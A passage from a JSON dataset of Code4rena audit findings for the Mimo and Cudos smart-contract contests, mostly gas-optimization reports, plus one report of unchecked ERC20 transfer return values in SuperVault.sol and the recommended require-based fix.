default values.\n\n# Event emitting of local variable\n\n## PROBLEM\n\nWhen emitting an event, using a local variable instead of a storage variable saves gas.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### InceptionVaultFactory.sol\n\n```\nInceptionVaultFactory.sol:218: emit CumulativeRateUpdated(_timeElapsed, _cumulativeRate);\n```\n\n### GenericMinerV2.sol\n\n```\nGenericMinerV2.sol:61: emit BoostConfigSet(_boostConfig);\nGenericMinerV2.sol:73: emit BoostConfigSet(_boostConfig);\n```\n\n### PARMinerV2.sol\n\n```\nPARMinerV2.sol:74: emit BoostConfigSet(_boostConfig);\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nWhen possible, emit the function parameter that is written in the storage variable instead of the storage variable itself to save gas.\nIn cases where the storage variable is read multiple times in the function, it is recommended to cache it into memory, then passing these cached variable in the `emit` statement, as explained in the [cache paragraph](#caching-storage-variables-in-memory-to-save-gas)\n\n\n# Prefix increments\n\n## IMPACT\n\nPrefix increments are cheaper than postfix increments.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### DexAddressProvider.sol\n\n```\nDexAddressProvider.sol:16: i++\n```\n\n### AdminInceptionVault.sol\n\n```\nAdminInceptionVault.sol:108: i++\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nchange `variable++` to `++variable`.\n\n# Require instead of AND\n\n## IMPACT\n\nRequire statements including conditions with the `&&` operator can be broken down in multiple require statements to save gas.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### GenericMinerV2.sol\n\n```\nGenericMinerV2.sol:58: require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\nGenericMinerV2.sol:70: require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\nGenericMinerV2.sol:331: require(multiplier >= 1e18 && multiplier <= _boostConfig.maxBoost, \"LM103\");\n```\n\n### PARMinerV2.sol\n\n```\nPARMinerV2.sol:52: require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\nPARMinerV2.sol:71: require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\nPARMinerV2.sol:426: require(multiplier >= 1e18 && multiplier <= _boostConfig.maxBoost, \"LM103\");\n```\n\n### SuperVault.sol\n\n```\nSuperVault.sol:344: require(proxy != address(0) && router != address(0), \"SV201\");\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nBreak down the single require statement in multiple require statements\n\ne.g: \n```\nGenericMinerV2.sol:331: -require(multiplier >= 1e18 && multiplier <= _boostConfig.maxBoost, \"LM103\");\n+require(multiplier >= 1e18)\n+require(multiplier <= _boostConfig.maxBoost, \"LM103\")\n```\n\n# SafeMath not necessary everywhere\n\n## IMPACT\n\nSince the version 0.8.0 update, overflow and underflow checks are performed automatically in Solidity. It is not necessary and costs additional gas to use the external library `SafeMath` to perform additions and subtractions\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### InceptionVaultsCore.sol\n\n```\nInceptionVaultsCore.sol:217: uint256 collateralValueToReceive = _amount.add(_amount.wadMul(_vaultConfig.liquidationBonus));\nInceptionVaultsCore.sol:222: uint256 discountedCollateralValue = collateralValue.wadDiv(_vaultConfig.liquidationBonus.add(WadRayMath.wad()));\nInceptionVaultsCore.sol:232: _reduceVaultDebt(_vaultId, repayAmount.add(insuranceAmount));\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nDo not use this library for additions and subtractions\n\n# Tight Variable Packing\n\n## PROBLEM\n\nSolidity contracts have contiguous 32 bytes (256 bits) slots used in storage.\nBy arranging the variables, it is possible to minimize the number of slots used within a contract's storage and therefore reduce deployment costs.\n\nstring type variables are each of 20 bytes size (way less than 32 bytes). However, they here take up a whole 32 bytes slot (they are contiguous).\n\nAs bool type variables are of size 1 byte, there's a slot here that can get saved by moving them.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### IInceptionVaultFactory.sol\n\n```\nIInceptionVaultFactory.sol:16:\nstruct InceptionVault {\n    address owner;\n    IAdminInceptionVault adminInceptionVault;\n    IInceptionVaultsCore inceptionVaultsCore;\n    IInceptionVaultsDataProvider inceptionVaultsDataProvider;\n    IInceptionVaultPriceFeed inceptionVaultPriceFeed;\n    bool isCustomPriceFeed;\n  }\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nPlace `isCustomPriceFeed` after `owner` to save one storage slot\n\n```\naddress owner;\n+bool isCustomPriceFeed;\nIAdminInceptionVault adminInceptionVault;\nIInceptionVaultsCore inceptionVaultsCore;\nIInceptionVaultsDataProvider inceptionVaultsDataProvider;\nIInceptionVaultPriceFeed inceptionVaultPriceFeed;\n```\n\n\n# Unchecked arithmetic\n\n## IMPACT\n\nThe default \"checked\" behavior costs more gas when adding/diving/multiplying, because under-the-hood those checks are implemented as a series of opcodes that, prior to performing the actual arithmetic, check for under/overflow and revert if it is detected.\n\nif it can statically be determined there is no possible way for your arithmetic to under/overflow (such as a condition in an if statement), surrounding the arithmetic in an `unchecked` block will save gas\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### SuperVault.sol\n\n```\nSuperVault.sol:110:  token.balanceOf(address(this)) is greater than flashloanRepayAmount (see condition one line above), underflow check unnecessary\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nPlace the arithmetic operations in an `unchecked` block\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/111"
    }
  },
  {
    "title": "Return values are not checked for `transferFrom` and `transfer` calls to external tokens",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L271\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L283\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L218\n\n\n# Vulnerability details\n\n\n\n# Impact\n\nwhen calling `transferFrom` or `transfer` of an external token a bool indicating success / fail\nis returned. Not checking this return value can cause the transaction to proceed even when the transfer has failed.\n\nfor example in [SuperVault.depositToVault](https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L271) `token.transferFrom` can fail but the asset will still get deposited.\n\n# Proof Of Concept \n\nFrom the [ERC20 docs](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20):\n\n> transfer(address recipient, uint256 amount) → bool\n> external\n> Moves amount tokens from the caller’s account to recipient.\n>\n> Returns a boolean value indicating whether the operation succeeded.\n>\n> Emits a Transfer event.\n\n>transferFrom(address sender, address >recipient, uint256 amount) → bool\n>external\n>\n> Moves amount tokens from sender to recipient using the allowance mechanism. amount is then deducted from the caller’s allowance.\n>\n> Returns a boolean value indicating whether the operation succeeded.\n> \n> Emits a Transfer event.\n\nIn \n[SuperValut.depositToVault](https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L271), \n[SuperValut.depositAndBorrowFromVault](https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L283), \n[SuperValut.emptyVault](https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L218) \n`transferFrom` (or `transfer`) return value is not checked. an `asset` which returns false in `transferFrom` (or `transfer`) can be passed to these functions. \n\nAn example for such asset is the [Basic Attention Token](https://github.com/brave-intl/basic-attention-token-crowdsale) which implements [this transfer()](https://github.com/brave-intl/basic-attention-token-crowdsale/blob/fc4881b2825b50f31f480c40ee97e30ac0a8db31/contracts/StandardToken.sol#L18) and this [transferFrom()](https://github.com/brave-intl/basic-attention-token-crowdsale/blob/fc4881b2825b50f31f480c40ee97e30ac0a8db31/contracts/StandardToken.sol#L29)\n\n# Tools Used\nManual Inspection with VSCode.\n\n# Recommended Mitigation Steps\n\ncheck the return values of these calls:\n`token.transferFrom(msg.sender, address(this), amount);`\n->\n`require(token.transferFrom(msg.sender, address(this), amount), \"transfer failed\");`\n\nand the same for `transfer()`\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/110"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## State variables that could be set immutable\n\nIn the following files there are state variables that could be set immutable to save gas. \n\n### Code instances:\n\n        _inceptionVaultPriceFeed in TInceptionVaultUnhealthyAssertion.sol\n        _inceptionCollateral in ChainlinkInceptionPriceFeed.sol\n        a in VaultsDataProvider.sol\n        _vaultsDataProvider in TIVSetup.sol\n        _baseChainlinkInceptionPriceFeed in TIVSetup.sol\n\n\n\n## Unused state variables\n\nUnused state variables are gas consuming at deployment (since they are located in storage) and are \na bad code practice. Removing those variables will decrease deployment gas cost and improve code quality. \nThis is a full list of all the unused storage variables we found in your code base. \n\n### Code instances:\n\n        BConst.sol, INIT_POOL_SUPPLY\n        TInceptionVaultUnhealthy.sol, _adminInceptionVault\n        TInceptionVaultUnhealthyProperty.sol, _exist\n        BConst.sol, BPOW_PRECISION\n        MIMODistributorV2.sol, _SECONDS_PER_YEAR\n\n\n\n## Caching array length can save gas\n\n\nCaching the array length is more gas efficient.\nThis is because access to a local variable in solidity is more efficient than query storage / calldata / memory.\nWe recommend to change from:    \n\n    for (uint256 i=0; i<array.length; i++) { ... }\n\nto: \n\n    uint len = array.length  \n    for (uint256 i=0; i<len; i++) { ... }\n\n\n### Code instances:\n\n        BaseDistributor.sol, _payees, 71\n        MinerPayer.sol, payees, 47\n        MinerPayer.sol, payees, 62\n        FeeDistributor.sol, _payees, 75\n        FeeDistributor.sol, payees, 47\n\n\n\n## Prefix increments are cheaper than postfix increments\n\nPrefix increments are cheaper than postfix increments. \nFurther more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change\nThere is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`).\nBut increments perform overflow checks that are not necessary in this case.\nThese functions use not using prefix increments (`++x`) or not using the unchecked keyword: \n\n### Code instances:\n\n        change to prefix increment and unchecked: VaultsDataProviderV1.sol, i, 159\n        change to prefix increment and unchecked: FeeDistributor.sol, i, 69\n        change to prefix increment and unchecked: VaultsCoreState.sol, i, 87\n        change to prefix increment and unchecked: AdminInceptionVault.sol, i, 108\n        change to prefix increment and unchecked: FeeDistributorV1.sol, i, 111\n\n\n\n## Unnecessary index init\n\n\nIn for loops you initialize the index to start from 0, but it already initialized to 0 in default and this assignment cost gas. \nIt is more clear and gas efficient to declare without assigning 0 and will have the same meaning:\n\n### Code instances:\n\n        MinerPayer.sol, 69\n        FeeDistributorV1.sol, 111\n        PreUseAirdrop.sol, 74\n        FeeDistributorV1.sol, 105\n        FeeDistributor.sol, 47\n\n\n\n## Storage double reading. Could save SLOAD\n\nReading a storage variable is gas costly (SLOAD). In cases of multiple read of a storage variable in the same scope, caching the first read (i.e saving as a local variable) can save gas and decrease the\n overall gas uses. The following is a list of functions and the storage variables that you read twice: \n\n### Code instances:\n\n        ChainlinkInceptionPriceFeed.sol: _PRICE_ORACLE_STALE_THRESHOLD is read twice in getAssetPrice\n        PriceFeed.sol: PRICE_ORACLE_STALE_THRESHOLD is read twice in getAssetPrice\n\n\n\n## Unnecessary default assignment\n\n\nUnnecessary default assignments, you can just declare and it will save gas and have the same meaning.\n    \n\n### Code instances:\n\n        BConst.sol (L#26) : uint256 public constant EXIT_FEE = 0; \n        MIMOBuybackUniswapV2.sol (L#20) : bool public whitelistEnabled = false; \n        VaultsDataProvider.sol (L#15) : uint256 public override vaultCount = 0; \n        VotingEscrow.sol (L#27) : bool public expired = false;\n        VaultsDataProviderV1.sol (L#15) : uint256 public override vaultCount = 0; \n\n\n\n## Short the following require messages\n\nThe following require messages are of length more than 32 and we think are short enough to short\nthem into exactly 32 characters such that it will be placed in one slot of memory and the require \nfunction will cost less gas. \nThe list: \n\n### Code instances:\n\n        Solidity file: MinerPayer.sol, In line 35, Require message length to shorten: 37, The message: Governance address can't be 0 address\n        Solidity file: VotingEscrow.sol, In line 96, Require message length to shorten: 36, The message: Cannot add to expired lock. Withdraw\n        Solidity file: MockBuggyERC20.sol, In line 138, Require message length to shorten: 34, The message: ERC20: approve to the zero address\n        Solidity file: VotingEscrow.sol, In line 81, Require message length to shorten: 38, The message: Can only lock until time in the future\n        Solidity file: MockBuggyERC20.sol, In line 102, Require message length to shorten: 37, The message: ERC20: transfer from the zero address\n\n\n\n## Use != 0 instead of > 0\n\n\nUsing != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)\n\n\n### Code instances:\n\n        VotingEscrow.sol, 94: change '_value > 0' to '_value != 0'\n        FeeDistributor.sol, 107: change '_shares > 0' to '_shares != 0'\n        GenericMiner.sol, 91: change 'value > 0' to 'value != 0'\n        GenericMinerV2.sol, 195: change 'value > 0' to 'value != 0'\n        PARMiner.sol, 163: change 'value > 0' to 'value != 0'\n\n\n\n## Unnecessary cast\n\n\n    \n### Code instances:\n\n        address InceptionVaultFactory.sol.cloneInceptionVault - unnecessary casting address(_assetOracle)\n        uint80 MockChainlinkAggregator.sol.getRoundData - unnecessary casting uint80(_roundId)\n        uint80 MockInceptionAggregator.sol.getRoundData - unnecessary casting uint80(_roundId)\n        address ConfigProviderV1.sol.setCollateralConfig - unnecessary casting address(_collateralType)\n        int256 ABDKMath64x64.sol.muli - unnecessary casting int256(y)\n\n\n\n## uint8 index\n\nDue to how the EVM natively works on 256 numbers, using a 8 bit number here introduces additional costs as the EVM has to properly enforce the limits of this smaller type. \nSee the warning at this link: https://docs.soliditylang.org/en/v0.8.0/internals/layout_in_storage.html#layout-of-state-variables-in-storage \nWe recommend to use uint256 for the index in every for loop instead using uint8: \n\n### Code instances:\n\n        ABDKMath64x64.sol, int256 bit, 467\n        AdminInceptionVault.sol, uint8 i, 108\n        TInceptionVaultFactory.sol, uint8 i, 20\n\n\n\n## Consider inline the following functions to save gas\n\n\n    You can inline the following functions instead of writing a specific function to save gas.\n    (see https://github.com/code-423n4/2021-11-nested-findings/issues/167 for a similar issue.)\n\n    \n### Code instances\n\n        WadRayMath.sol, ray, { return _RAY; }\n        WadRayMath.sol, wad, { return _WAD; }\n        BNum.sol, btoi, { return a / BONE; }\n        ABDKMath64x64.sol, to128x128, { return int256(x) << 64; }\n        WadRayMath.sol, wadMul, { return _HALF_WAD.add(a.mul(b)).div(_WAD); }\n\n\n\n## Inline one time use functions\n\n\nThe following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.\n    \n\n### Code instances:\n\n        BNum.sol, bdiv\n        BNum.sol, bpowi\n        SuperVault.sol, rebalanceOperation\n        SuperVault.sol, emptyVaultOperation\n        GenericMinerV2.sol, _getBoostMultiplier\n\n\n\n## Cache powers of 10 used several times\n\nYou calculate the power of 10 every time you use it instead of caching it once as a constant variable and using it instead. \nFix the following code lines: \n\n### Code instances:\n\nGUniLPOracle.sol, 45 : You should cache the used power of 10 as constant state variable since it's used several times (2):      _tokenDecimalsUnitA = 10**decimalsA;\n\nGUniLPOracle.sol, 46 : You should cache the used power of 10 as constant state variable since it's used several times (2):      _tokenDecimalsOffsetA = 10**(18 - decimalsA);\n\nGUniLPOracle.sol, 49 : You should cache the used power of 10 as constant state variable since it's used several times (2):      _tokenDecimalsUnitB = 10**decimalsB;\n\nGUniLPOracle.sol, 50 : You should cache the used power of 10 as constant state variable since it's used several times (2):      _tokenDecimalsOffsetB = 10**(18 - decimalsB);\n\n\n\n\n## Upgrade pragma to at least 0.8.4\n\n\nUsing newer compiler versions and the optimizer gives gas optimizations\nand additional safety checks are available for free.\n\nThe advantages of versions 0.8.* over <0.8.0 are:\n\n        1. Safemath by default from 0.8.0 (can be more gas efficient than library based safemath.)\n        2. Low level inliner : from 0.8.2, leads to cheaper runtime gas. Especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not inlined, they cost an additional 20 to 40 gas because of 2 extra jump instructions and additional stack operations needed for function calls.\n        3. Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.\n        4. Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n    \n### Code instances:\n\n        BoringOwnable.sol\n        USDX.sol\n        TInceptionVaultUnhealthyProperty.sol\n        ISTABLEX.sol\n        IUniswapV2Router01.sol\n\n\n\n## Gas Optimization On The 2^256-1\n\n\nSome projects (e.g. Uniswap - https://github.com/Uniswap/interface/blob/main/src/hooks/useApproveCallback.ts#L88)\nset the default value of the user's allowance to 2^256 - 1. Since the value 2^256 - 1 can also be represented in \nhex as 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff. From Ethereum's yellow paper we know \nthat zeros are cheaper than non-zero values in the hex representation. Considering this fact, an alternative \nchoice could be now 0x8000000000000000000000000000000000000000000000000000000000000000 or 2^255 to represent \n\"infinity\". If you do the calculations with Remix, you will see that the former costs 47'872 gas, while the latter \ncosts 45'888 gas. If you accept that infinity can also be represented via 2^255 (instead of 2^256-1), which almost \nall projects can - you can already save about 4% gas leveraging this optimisation trick on those calculations.\n     \n    \n### Code instances:\n\n        SuperVault.sol (L#326): token.approve(address(a.core()), 2**256 - 1);)\n        VaultsCoreState.sol (L#18): uint256 internal constant _MAX_INT = 2**256 - 1; )\n        MIMOBuybackUniswapV2.sol (L#61): router.swapExactTokensForTokens( PAR.balanceOf(address(this)), 0, path, address(this), 2**256 - 1 );)\n        MIMOBuyBack.sol (L#36): PAR.approve(address(balancer), 2**256 - 1);)\n        MIMOBuybackUniswapV2.sol (L#35): PAR.approve(address(router), 2**256 - 1);)\n\n\n\n## Do not cache msg.sender\n\n\nWe recommend not to cache msg.sender since calling it is 2 gas while reading a variable is more.\n\n\n### Code instances:\n\n        https://github.com/code-423n4/2022-04-mimo/tree/main/core/contracts/inception/BoringOwnable.sol#L19\n        https://github.com/code-423n4/2022-04-mimo/tree/main/core/contracts/governance/Timelock.sol#L44\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/105"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "##GAS\n\n1.\nTitle: Initializing var with default value\n\nOccurrences:\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L54\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L231\n\nBy declaring var by not set its default value (0 for uint) can save deployment gas cost\nChange to:\n```\n\tuint256 public state_lastValsetNonce;\n```\nAnd also for i inside for() loop:\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L128\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L233\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L263\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L453\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L568\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L579\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L660\n\n\n2.\nTitle: Using prefix increment for `i` in a for() loop\n\nOccurrences:\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L128\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L233\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L263\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L282-L284\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L453\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L568\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L579\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L660\n\nUsing prefix increment and unchecked for `i` can save execution gas fee:\n```\n for (uint256 i = 0; i < _users.length; ++i) {\n            require(\n                _users[i] != address(0),\n                \"User is the zero address\"\n            );\n            whitelisted[_users[i]] = _isWhitelisted;\n        }\n```\n\n\n3.\nTitle: Using `calldata` to store array as a parameter\n\nOccurrences:\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L125\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L145-L149\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L220-L226\n\nStoring read only array with calldata is more effective for gas opt than using memory\n\n\n4.\nTitle: Using && is not effective\n\nOccurence:\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L411-L414\n\nInstead of using && operator which cost more 15 gas per execution, Using multiple `require()` is more effective\nChange to:\n```\n\n\t\t\trequire(\n\t\t\t\t_amounts.length == _destinations.length,\n\t\t\t\t\"Malformed batch of transactions\"\n\t\t\t);\n\t\t\trequire(\n\t\t\t\t_amounts.length == _fees.length,\n\t\t\t\t\"Malformed batch of transactions\"\n\t\t\t);\n```\n\n\n5.\nTitle: Variable can set to constant\n\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/CosmosToken.sol#L5\n\nSet `MAX_UINT` var to constant can save gas on every cosmosERC20 deployment\n```\n\tuint256 constant MAX_UINT = 2**256 - 1;\n\n```\n\n\n6.\nTitle: Function visibility can set to external\n\nOccurrences:\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L124\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L140\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L144\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L166-L170\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L364\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L595\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L611\n\nThe functions is never called in the contract. Instead of set the visibility to public, setting it to external is more effective\n\n\n7.\nTitle: Using += operator\n\nhttps://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L244\n\nChange the code to:\n```\n\tcumulativePower += _currentPowers[i]\n```\nCan save gas",
    "dataSource": {
      "name": "code-423n4/2022-05-cudos-findings",
      "repo": "https://github.com/code-423n4/2022-05-cudos-findings",
      "url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/148"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Gas Optimizations\n\n### Summary\n\n| |Title|Instances|\n|-|:-|:-:|\n| 1 | State variables only set in the constructor should be declared `immutable` | 3 |\n| 2 | State variables should be cached in stack variables rather than re-reading them from storage | 8 |\n| 3 | `<array>.length` should not be looked up in every loop of a `for`-loop | 7 |\n| 4 | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 16 |\n| 5 | Using `bool`s for storage incurs overhead | 1 |\n| 6 | Use a more recent version of solidity | 2 |\n| 7 | It costs more gas to initialize variables to zero than to let the default of zero be applied | 9 |\n| 8 | `++i` costs less gas than `++i`, especially when it's used in `for`-loops (`--i`/`i--` too) | 7 |\n| 9 | Splitting `require()` statements that use `&&` saves gas | 4 |\n| 10 | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 4 |\n| 11 | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 4 |\n| 12 | Functions guaranteed to revert when called by normal users can be marked `payable` | 1 |\n| 13 | `public` functions not called by the contract should be declared `external` instead | 10 |\n| 14 | Return from function rather than breaking out of loop | 1 |\n| 15 | `require()` or `revert()` statements that check input arguments should be at the top of the function | 3 |\n| 16 | Remove test code to save deployment gas | 1 |\n\nTotal: 81 instances over 16 classes\n\n### 1. State variables only set in the constructor should be declared `immutable`\nAvoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a `PUSH32` (3 gas).\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n60   \tbytes32 public state_gravityId;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L60\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n61   \tuint256 public state_powerThreshold;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L61\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n63   \tCudosAccessControls public cudosAccessControls;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L63\n\n### 2. State variables should be cached in stack variables rather than re-reading them from storage\nThe instances below point to the second+ access of a state variable within a function. Caching will replace each Gwarmaccess (100 gas) with a much cheaper stack read.\nLess obvious fixes/optimizations include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n352   \t\t\tstate_lastEventNonce,\n```\nstate_lastEventNonce\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L352\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n466   \t\t\temit TransactionBatchExecutedEvent(_batchNonce, _tokenContract, state_lastEventNonce);\n```\nstate_lastEventNonce\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L466\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n590   \t\t\t\tstate_lastEventNonce\n```\nstate_lastEventNonce\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L590\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n607   \t\t\tstate_lastEventNonce\n```\nstate_lastEventNonce\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L607\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #5\n\n628   \t\t\tstate_lastEventNonce\n```\nstate_lastEventNonce\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L628\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #6\n\n321   \t\tbytes32 newCheckpoint = makeCheckpoint(_newValset, state_gravityId);\n```\nstate_gravityId\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L321\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #7\n\n431   \t\t\t\t\t\tstate_gravityId,\n```\nstate_gravityId\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L431\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #8\n\n533   \t\t\t\tstate_gravityId,\n```\nstate_gravityId\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L533\n\n### 3. `<array>.length` should not be looked up in every loop of a `for`-loop\nThe overheads outlined below are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (100 gas)\n* memory arrays use `MLOAD` (3 gas)\n* calldata arrays use `CALLDATALOAD` (3 gas)\n\nCaching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n128   \t\t for (uint256 i = 0; i < _users.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L128\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n233   \t\tfor (uint256 i = 0; i < _currentValidators.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L233\n\n```solidity\nFile: 